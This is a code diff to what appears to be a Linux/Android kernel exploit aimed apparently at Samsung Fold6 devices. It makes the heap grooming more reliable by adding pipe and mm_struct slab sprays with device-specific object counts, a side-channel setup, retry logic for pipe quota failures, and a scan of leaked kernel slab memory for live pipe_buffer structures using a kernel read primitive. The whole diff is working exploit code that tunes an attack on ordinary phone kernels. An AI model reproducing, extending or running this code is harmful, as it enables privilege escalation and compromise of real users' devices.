@@ -14,6 +14,18 @@ static int pipe_fds_e[PIPE_E_COUNT][2];
 static int pipe_fds_drain[PIPE_DRAIN][2];
 static int pipe_fds_reclaim[PIPE_RECLAIM][2];
 
+/* F_SETPIPE_SZ is subject to a per-UID page budget on Android.  Keep the
+ * failure state separate from SYSCHK: pr_error() is fatal in this build, but
+ * an expected quota miss must return to the parent so it can tear down the
+ * whole attempt and retry cleanly. */
+static int pipe_resize_failed;
+static int pipe_resize_errno;
+static int pipe_resize_fd = -1;
+static size_t pipe_resize_slots;
+static size_t pipe_resize_current = 0;
+static const char *pipe_resize_stage = "none";
+static size_t pipe_resize_index;
+
 pid_t pipe_prepare_child = -1;
 uint64_t kmalloc_pipe_cache;
 uint64_t kmalloc_normal_1k_cache;
@@ -63,7 +75,23 @@ void init_ctx(struct mm_ctx *ctx, size_t cnt) {
 }
 
 void resize_pipe_slots(int pipefd[2], size_t slots) {
-  SYSCHK(fcntl(pipefd[0], F_SETPIPE_SZ, slots * PAGE_SIZE));
+  errno = 0;
+  int current = fcntl(pipefd[0], F_GETPIPE_SZ);
+  int get_errno = errno;
+  errno = 0;
+  int resized = fcntl(pipefd[0], F_SETPIPE_SZ, slots * PAGE_SIZE);
+  int set_errno = errno;
+  if (resized == -1) {
+    pipe_resize_failed = 1;
+    pipe_resize_errno = set_errno;
+    pipe_resize_fd = pipefd[0];
+    pipe_resize_slots = slots;
+    pipe_resize_current = current >= 0 ? (size_t)current / PAGE_SIZE : 0;
+    pr_warning("pipe resize failed stage=%s idx=%zu fd=%d want_slots=%zu "
+               "current_slots=%zu get_errno=%d errno=%d\n",
+               pipe_resize_stage, pipe_resize_index, pipefd[0], slots,
+               pipe_resize_current, get_errno, set_errno);
+  }
 }
 
 void make_pipe_object(int pipefd[2]) {
@@ -121,11 +149,32 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   struct mm_ctx pre;
   struct mm_ctx post;
   size_t objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
+  size_t prep_count = 32 * objs_per_slab;
+  size_t spray_count = (1 + MM_PARTIALS) * objs_per_slab;
+  size_t pre_count = objs_per_slab - 1;
+  size_t post_count = objs_per_slab;
 
-  init_ctx(&prep, 32 * objs_per_slab);
-  init_ctx(&spray, (1 + MM_PARTIALS) * objs_per_slab);
-  init_ctx(&pre, objs_per_slab - 1);
-  init_ctx(&post, objs_per_slab);
+  /* The captured Fold6 path uses the older 0x400 mm allocation geometry for
+   * this page-reclaim stage, even though the task-page spray can use the
+   * runtime BTF size.  Its object counts are 1024/192/31/32.  Keeping this
+   * separate is important: the page leak is a slab-reclaim oracle, not the
+   * initial task-page leak. */
+  int umh_pipe_geometry = active_offsets && active_offsets->umh_root;
+  if (umh_pipe_geometry) {
+    objs_per_slab = ORDER3_SIZE / 0x400;
+    prep_count = 1024;
+    spray_count = 192;
+    pre_count = 31;
+    post_count = 32;
+  }
+
+  pr_info("pipe page prep geometry samsung=%d mm_stride=%zx objs=%zu counts=%zu/%zu/%zu/%zu\n",
+          umh_pipe_geometry, umh_pipe_geometry ? (size_t)0x400 : MM_STRUCT_SZ,
+          objs_per_slab, prep_count, spray_count, pre_count, post_count);
+  init_ctx(&prep, prep_count);
+  init_ctx(&spray, spray_count);
+  init_ctx(&pre, pre_count);
+  init_ctx(&post, post_count);
 
   for (size_t i = 0; i < prep.mm_cnt; i++) {
     prep.childs[i] = -1;
@@ -136,7 +185,12 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
     spray.memfds[i] = clone_memfd();
   }
 
-  setup_kernelsnitch();
+  if (umh_pipe_geometry) {
+    /* The UMH geometry uses 0x400 as the candidate stride here. */
+    setup_kernelsnitch_sized(0x400);
+  } else {
+    setup_kernelsnitch();
+  }
 
   for (size_t i = 0; i < pre.mm_cnt; i++) {
     pre.childs[i] = -1;
@@ -216,16 +270,40 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
 
   shape_pipe_cache();
+  if (pipe_resize_failed) {
+    pr_warning("pipe page child abort after shape resize errno=%d fd=%d "
+               "stage=%s idx=%zu\n",
+               pipe_resize_errno, pipe_resize_fd, pipe_resize_stage,
+               pipe_resize_index);
+    free(buf);
+    return 0;
+  }
 
   for (size_t i = 0; i < PIPE_DRAIN; i++) {
+    pipe_resize_stage = "child-drain";
+    pipe_resize_index = i;
     alloc_pipe_object(pipe_fds_drain[i]);
+    if (pipe_resize_failed) {
+      pr_warning("pipe page child abort during drain i=%zu errno=%d fd=%d\n",
+                 i, pipe_resize_errno, pipe_resize_fd);
+      free(buf);
+      return 0;
+    }
   }
 
   pin_to_core(CORE);
   SYSCHK(close(skb_sv[0]));
   SYSCHK(close(skb_sv[1]));
   for (size_t i = 0; i < PIPE_RECLAIM; i++) {
+    pipe_resize_stage = "child-reclaim";
+    pipe_resize_index = i;
     alloc_pipe_object(pipe_fds_reclaim[i]);
+    if (pipe_resize_failed) {
+      pr_warning("pipe page child abort during reclaim i=%zu errno=%d fd=%d\n",
+                 i, pipe_resize_errno, pipe_resize_fd);
+      free(buf);
+      return 0;
+    }
   }
 
   free(buf);
@@ -233,27 +311,55 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
 }
 
 uintptr_t prepare_pipe_buffer_page(void) {
+  pipe_resize_failed = 0;
+  pipe_resize_errno = 0;
+  pipe_resize_fd = -1;
+  pipe_resize_slots = 0;
+  pipe_resize_current = 0;
+  pipe_resize_stage = "parent";
+  pipe_resize_index = 0;
+
   if (PIPE_SHAPE_ROUNDS != 0) {
     for (size_t i = 0; i < PIPE_N_COUNT; i++) {
+      pipe_resize_stage = "parent-n";
+      pipe_resize_index = i;
       make_pipe_object(pipe_fds_n[i]);
     }
     for (size_t i = 0; i < PIPE_C_COUNT; i++) {
+      pipe_resize_stage = "parent-c";
+      pipe_resize_index = i;
       make_pipe_object(pipe_fds_c[i]);
     }
     for (size_t i = 0; i < PIPE_E_COUNT; i++) {
+      pipe_resize_stage = "parent-e";
+      pipe_resize_index = i;
       make_pipe_object(pipe_fds_e[i]);
     }
   }
   for (size_t i = 0; i < PIPE_DRAIN; i++) {
+    pipe_resize_stage = "parent-drain";
+    pipe_resize_index = i;
     make_pipe_object(pipe_fds_drain[i]);
   }
   for (size_t i = 0; i < PIPE_RECLAIM; i++) {
+    pipe_resize_stage = "parent-reclaim";
+    pipe_resize_index = i;
     make_pipe_object(pipe_fds_reclaim[i]);
   }
   pipe_objects_ready = 1;
 
+  if (pipe_resize_failed) {
+    pr_warning("pipe page parent allocation failed errno=%d fd=%d stage=%s "
+               "idx=%zu want_slots=%zu current_slots=%zu; cleaning up\n",
+               pipe_resize_errno, pipe_resize_fd, pipe_resize_stage,
+               pipe_resize_index, pipe_resize_slots, pipe_resize_current);
+    reset_pipe_attempt();
+    return 0;
+  }
+
   int result_pipe[2];
-  SYSCHK(pipe(result_pipe));
+  /* The result channel must not consume pipe-user-pages quota. */
+  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, result_pipe));
   pid_t child = SYSCHK(fork());
   if (child == 0) {
     SYSCHK(close(result_pipe[0]));
@@ -269,8 +375,13 @@ uintptr_t prepare_pipe_buffer_page(void) {
   uintptr_t base = 0;
   ssize_t got = read(result_pipe[0], &base, sizeof(base));
   SYSCHK(close(result_pipe[0]));
-  if (got != (ssize_t)sizeof(base)) {
-    pr_error("pipe page child did not report base\n");
+  if (got != (ssize_t)sizeof(base) || base == 0) {
+    pr_warning("pipe page child did not report valid base got=%zd base=%016zx "
+               "resize_failed=%d errno=%d stage=%s idx=%zu; cleaning up\n",
+               got, base, pipe_resize_failed, pipe_resize_errno,
+               pipe_resize_stage, pipe_resize_index);
+    reset_pipe_attempt();
+    return 0;
   }
   return base;
 }
@@ -452,6 +563,16 @@ int find_pipe_buffer(int fd, uintptr_t base) {
   memcpy(&pipe_scan_q2, slab + 0x10, 8);
   memcpy(&pipe_scan_q3, slab + 0x18, 8);
 
+  uintptr_t best_addr = 0;
+  uintptr_t best_page = 0;
+  uint64_t best_ops = 0;
+  uint64_t best_private = 0;
+  uint32_t best_len = 0;
+  uint32_t best_flags = 0;
+  int best_idx = -1;
+  int candidate_count = 0;
+  int data_verified_count = 0;
+
   for (size_t off = 0; off + sizeof(struct user_pipe_buffer) <= ORDER3_SIZE;
        off += 8) {
     struct user_pipe_buffer pb;
@@ -481,18 +602,60 @@ int find_pipe_buffer(int fd, uintptr_t base) {
       continue;
     }
 
-    pipebuf_addr = base + off;
-    pipebuf_pipe_idx = (int)pb.len - 1;
-    pipe_probe_found = 1;
-    pipe_probe_page = pb.page;
-    pipe_probe_ops = pb.ops;
-    pipe_probe_private = pb.private;
-    pipe_probe_len = pb.len;
-    pipe_probe_flags = pb.flags;
-    return 1;
+    candidate_count++;
+    int probe_len = pb.len < 8 ? (int)pb.len : 8;
+    uintptr_t data_page = page_to_direct(pb.page);
+    unsigned char data_probe[8] = {0};
+    int data_ok = is_direct_ptr(data_page) &&
+                  kernel_read_data(fd, data_page, data_probe, probe_len) ==
+                    (ssize_t)probe_len;
+    if (data_ok) {
+      for (int j = 0; j < probe_len; j++) {
+        if (data_probe[j] != 0x61) {
+          data_ok = 0;
+          break;
+        }
+      }
+    }
+    pr_info("pipe candidate off=%zx idx=%u page=%016llx data=%d\n",
+            off, pb.len - 1, (unsigned long long)pb.page, data_ok);
+    if (!data_ok) {
+      continue;
+    }
+    data_verified_count++;
+
+    /* Do not trust the first metadata-shaped object.  A stale object can
+     * survive in the reclaimed slab; the live pipe's data page carries the
+     * marker written just above.  Prefer the highest verified marker when
+     * more than one candidate survives. */
+    if (best_addr == 0 || pb.len > best_len) {
+      best_addr = base + off;
+      best_page = pb.page;
+      best_ops = pb.ops;
+      best_private = pb.private;
+      best_len = pb.len;
+      best_flags = pb.flags;
+      best_idx = (int)pb.len - 1;
+    }
   }
 
-  return 0;
+  if (best_addr == 0) {
+    pr_warning("pipe candidate validation failed metadata=%d data=%d\n",
+               candidate_count, data_verified_count);
+    return 0;
+  }
+
+  pipebuf_addr = best_addr;
+  pipebuf_pipe_idx = best_idx;
+  pipe_probe_found = 1;
+  pipe_probe_page = best_page;
+  pipe_probe_ops = best_ops;
+  pipe_probe_private = best_private;
+  pipe_probe_len = best_len;
+  pipe_probe_flags = best_flags;
+  pr_info("pipe candidate selected addr=%016zx idx=%d verified=%d\n",
+          pipebuf_addr, pipebuf_pipe_idx, data_verified_count);
+  return 1;
 }
 
 int pipe_phys_read(
